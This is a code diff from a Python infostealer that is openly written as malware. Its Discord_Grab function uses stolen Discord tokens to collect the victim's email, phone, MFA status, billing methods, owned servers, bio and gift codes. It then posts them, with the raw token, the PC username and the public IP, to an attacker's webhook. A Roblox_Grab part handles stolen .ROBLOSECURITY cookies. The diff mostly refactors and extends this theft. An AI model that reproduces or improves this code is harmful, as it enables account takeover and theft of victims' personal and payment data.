@@ -538,220 +538,137 @@ def Discord_Grab():
             self.tokens = extract_tokens().tokens
             self.webhook = SyncWebhook.from_url(webhook)
 
-        def calc_flags(self, flags: int) -> list:
-            flags_dict = {
-                "DISCORD_EMPLOYEE": {
-                    "emoji": "<:staff:968704541946167357>",
-                    "shift": 0,
-                    "ind": 1
-                },
-                "DISCORD_PARTNER": {
-                    "emoji": "<:partner:968704542021652560>",
-                    "shift": 1,
-                    "ind": 2
-                },
-                "HYPESQUAD_EVENTS": {
-                    "emoji": "<:hypersquad_events:968704541774192693>",
-                    "shift": 2,
-                    "ind": 4
-                },
-                "BUG_HUNTER_LEVEL_1": {
-                    "emoji": "<:bug_hunter_1:968704541677723648>",
-                    "shift": 3,
-                    "ind": 4
-                },
-                "HOUSE_BRAVERY": {
-                    "emoji": "<:hypersquad_1:968704541501571133>",
-                    "shift": 6,
-                    "ind": 64
-                },
-                "HOUSE_BRILLIANCE": {
-                    "emoji": "<:hypersquad_2:968704541883261018>",
-                    "shift": 7,
-                    "ind": 128
-                },
-                "HOUSE_BALANCE": {
-                    "emoji": "<:hypersquad_3:968704541874860082>",
-                    "shift": 8,
-                    "ind": 256
-                },
-                "EARLY_SUPPORTER": {
-                    "emoji": "<:early_supporter:968704542126510090>",
-                    "shift": 9,
-                    "ind": 512
-                },
-                "BUG_HUNTER_LEVEL_2": {
-                    "emoji": "<:bug_hunter_2:968704541774217246>",
-                    "shift": 14,
-                    "ind": 16384
-                },
-                "VERIFIED_BOT_DEVELOPER": {
-                    "emoji": "<:verified_dev:968704541702905886>",
-                    "shift": 17,
-                    "ind": 131072
-                },
-                "ACTIVE_DEVELOPER": {
-                    "emoji": "<:Active_Dev:1045024909690163210>",
-                    "shift": 22,
-                    "ind": 4194304
-                },
-                "CERTIFIED_MODERATOR": {
-                    "emoji": "<:certified_moderator:988996447938674699>",
-                    "shift": 18,
-                    "ind": 262144
-                },
-                "SPAMMER": {
-                    "emoji": "⌨",
-                    "shift": 20,
-                    "ind": 1048704
-                },
-            }
-
-            return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
-
         def upload(self):
             if not self.tokens:
                 return
 
             for token_discord in self.tokens:
-                user = requests.get(
-                    'https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord}).json()
-                billing_discord = requests.get(
-                    'https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_discord}).json()
-                guilds = requests.get(
-                    'https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token_discord}).json()
-                friends = requests.get(
-                    'https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token_discord}).json()
-                gift_codes_discord = requests.get(
-                    'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token_discord}).json()
+                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token_discord}).json()
 
-                username_discord = user['username'] + '#' + user['discriminator']
-                user_id_discord = user['id']
-                email_discord = user['email']
-                phone_discord = user['phone']
-                mfa_discord = user['mfa_enabled']
                 try:
-                    avatar_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif" if requests.get(
-                        f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.png"
+                    username_discord = user['username'] + '#' + user['discriminator']
                 except:
-                    avatar_discord = avatar_embed
-                badges_discord = ' '.join([flag[0]
-                                  for flag in self.calc_flags(user['public_flags'])])
+                    username_discord = "None"
 
-                if user['premium_type'] == 0:
-                    nitro_discord = 'None'
-                elif user['premium_type'] == 1:
-                    nitro_discord = 'Nitro Classic'
-                elif user['premium_type'] == 2:
-                    nitro_discord = 'Nitro Boosts'
-                elif user['premium_type'] == 3:
-                    nitro_discord = 'Nitro Basic'
-                else:
-                    nitro_discord = 'None'
+                try:
+                    display_name_discord = user['global_name']
+                except:
+                    display_name_discord = "None"
 
-                if billing_discord:
-                    payment_methods = []
+                try:
+                    user_id_discord = user['id']
+                except:
+                    user_id_discord = "None"
 
-                    for method in billing_discord:
-                        if method['type'] == 1:
-                            payment_methods.append('💳')
+                try:
+                    email_discord = user['email']
+                except:
+                    email_discord = "None"
+                
+                try:
+                    phone_discord = user['phone']
+                except:
+                    phone_discord = "None"
+                
+                try:
+                    mfa_discord = user['mfa_enabled']
+                except:
+                    mfa_discord = "None"
+                
+                try:
+                    country_discord = user['locale']
+                except:
+                    country_discord = "None"
 
-                        elif method['type'] == 2:
-                            payment_methods.append("Paypal: ")
+                try:
+                    if user['premium_type'] == 0:
+                        nitro_discord = 'False'
+                    elif user['premium_type'] == 1:
+                        nitro_discord = 'Nitro Classic'
+                    elif user['premium_type'] == 2:
+                        nitro_discord = 'Nitro Boosts'
+                    elif user['premium_type'] == 3:
+                        nitro_discord = 'Nitro Basic'
+                    else:
+                        nitro_discord = 'False'
+                except:
+                    nitro_discord = "None"
+                
+                try:
+                    avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user['avatar']}.png"
+                except:
+                    avatar_url_discord = avatar_embed
 
-                        else:
-                            payment_methods.append('❓')
+                try:
+                    bio_discord = user['bio']
+                    if not bio_discord.strip() or bio_discord.isspace():
+                        bio_discord = "None"
+                except:
+                    bio_discord = "None"
 
-                    payment_methods = ', '.join(payment_methods)
+                try:
+                    guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token_discord})
+                    if guilds_response.status_code == 200:
+                        guilds = guilds_response.json()
+                        try:
+                            owner_guilds = [guild for guild in guilds if guild['owner']]
+                            owner_guild_count = len(owner_guilds)
+                            owner_guilds_names = [] 
+                            if owner_guilds:
+                                for guild in owner_guilds:
+                                    owner_guilds_names.append(f"{guild['name']} ({guild['id']}) / ")
+                                owner_guilds_names = "\n" + "\n".join(owner_guilds_names)
+                        except:
+                            owner_guild_count = "None"
+                            owner_guilds_names = "None" 
+                except:
+                    owner_guild_count = "None"
+                    owner_guilds_names = "None"
+            
+                try:
+                    billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token_discord}).json()
+                    if billing_discord:
+                        payment_methods_discord = []
 
-                else:
-                    billing_discord = None
-
-                if guilds:
-                    hq_guilds_discord = []
-                    for guild in guilds:
-                        admin = True if guild['permissions'] == '4398046511103' else False
-                        if admin and guild['approximate_member_count'] >= 100:
-                            owner = "✅" if guild['owner'] else "❌"
-
-                            invites = requests.get(
-                                f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token_discord}).json()
-                            if len(invites) > 0:
-                                invite = f"https://discord.gg/{invites[0]['code']}"
+                        for method in billing_discord:
+                            if method['type'] == 1:
+                                payment_methods_discord.append('CB')
+                            elif method['type'] == 2:
+                                payment_methods_discord.append("Paypal")
                             else:
-                                invite = "None"
+                                payment_methods_discord.append('Other')
+                        payment_methods_discord = ' / '.join(payment_methods_discord)
+                    else:
+                        payment_methods_discord = "None"
+                except:
+                    payment_methods_discord = "None"
 
-                            data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
-
-                            if len('\n'.join(hq_guilds_discord)) + len(data) >= 1024:
+                try:
+                    gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token_discord}).json()
+                    if gift_codes:
+                        codes = []
+                        for gift_codes_discord in gift_codes:
+                            name = gift_codes_discord['promotion']['outbound_title']
+                            gift_codes_discord = gift_codes_discord['code']
+                            data = f"Gift: {name}\nCode: {gift_codes_discord}"
+                            if len('\n\n'.join(gift_codes_discord)) + len(data) >= 1024:
                                 break
-
-                            hq_guilds_discord.append(data)
-
-                    if len(hq_guilds_discord) > 0:
-                        hq_guilds_discord = '\n'.join(hq_guilds_discord)
-
+                            gift_codes_discord.append(data)
+                        if len(gift_codes_discord) > 0:
+                            gift_codes_discord = '\n\n'.join(gift_codes_discord)
+                        else:
+                            gift_codes_discord = "None"
                     else:
-                        hq_guilds_discord = None
-
-                else:
-                    hq_guilds_discord = None
-
-                if friends:
-                    hq_friends_discord = []
-                    for friend in friends:
-                        unprefered_flags = [64, 128, 256, 1048704]
-                        inds = [flag[1] for flag in self.calc_flags(
-                            friend['user']['public_flags'])[::-1]]
-                        for flag in unprefered_flags:
-                            inds.remove(flag) if flag in inds else None
-                        if inds != []:
-                            hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
-                                friend['user']['public_flags'])[::-1]])
-
-                            data = f"{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})  "
-
-                            if len('\n'.join(hq_friends_discord)) + len(data) >= 1024:
-                                break
-
-                            hq_friends_discord.append(data)
-
-                    if len(hq_friends_discord) > 0:
-                        hq_friends_discord = '\n'.join(hq_friends_discord)
-
-                    else:
-                        hq_friends_discord = None
-
-                else:
-                    hq_friends_discord = None
-
-                if gift_codes_discord:
-                    codes = []
-                    for code in gift_codes_discord:
-                        name = code['promotion']['outbound_title']
-                        code = code['code']
-
-                        data = f":gift: `{name}`\n:ticket: `{code}`"
-
-                        if len('\n\n'.join(codes)) + len(data) >= 1024:
-                            break
-
-                        codes.append(data)
-
-                    if len(codes) > 0:
-                        codes = '\n\n'.join(codes)
-
-                    else:
-                        codes = None
-
-                else:
-                    gift_codes_discord = None
+                        gift_codes_discord = "None"
+                except:
+                    gift_codes_discord = "None"
 
                 embed = Embed(title=f':flag_{country_code}: | Discord Info `{username_pc} "{ip_address_public}"`:', color=color_embed)
-                embed.set_thumbnail(url=avatar_discord)
-
+                embed.set_thumbnail(url=avatar_url_discord)
                 embed.add_field(name=":bust_in_silhouette: | Username:",
                                 value=f"```{username_discord}```", inline=True)
+                embed.add_field(name=":bust_in_silhouette: | Display Name:",
+                                value=f"```{display_name_discord}```", inline=True)
                 embed.add_field(name=":robot: | Id:",
                                 value=f"```{user_id_discord}```", inline=True)
                 embed.add_field(name=":e_mail: | Email:",
@@ -762,18 +679,18 @@ def Discord_Grab():
                                 value=f"```{token_discord}```", inline=True)
                 embed.add_field(name=":rocket: | Nitro:",
                                 value=f"```{nitro_discord}```", inline=True)
+                embed.add_field(name=":earth_africa: | Language:",
+                                value=f"```{country_discord}```", inline=True)
                 embed.add_field(name=":moneybag: | Billing:",
-                                value=f"```{billing_discord}```", inline=True)
-                embed.add_field(name=":people_hugging: | Friends:",
-                                value=f"```{hq_friends_discord}```", inline=True)
-                embed.add_field(name=":tickets: | Badges:",
-                                value=f"{badges_discord}", inline=True)   
+                                value=f"```{payment_methods_discord}```", inline=True)
                 embed.add_field(name=":gift: | Gift Code:",
                                 value=f"```{gift_codes_discord}```", inline=True)
                 embed.add_field(name=":lock: | Multi-Factor Authentication:",
                                 value=f"```{mfa_discord}```", inline=True)
-                embed.add_field(name=":link: | Guilds:",
-                                value=f"{hq_guilds_discord}", inline=True)
+                embed.add_field(name=":identification_card: | Bio:",
+                                value=f"```{bio_discord}```", inline=True)
+                embed.add_field(name=f":link: | Owner Guilds ({owner_guild_count}):",
+                                value=f"```{owner_guilds_names}```", inline=True)
 
                 embed.set_footer(text=footer_text, icon_url=avatar_embed)
 
@@ -1186,7 +1103,7 @@ def Roblox_Grab():
                 info = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie})
                 information = json.loads(info.text)
             except:
-                ()
+                pass
 
             try:
                 username_roblox = information['UserName']
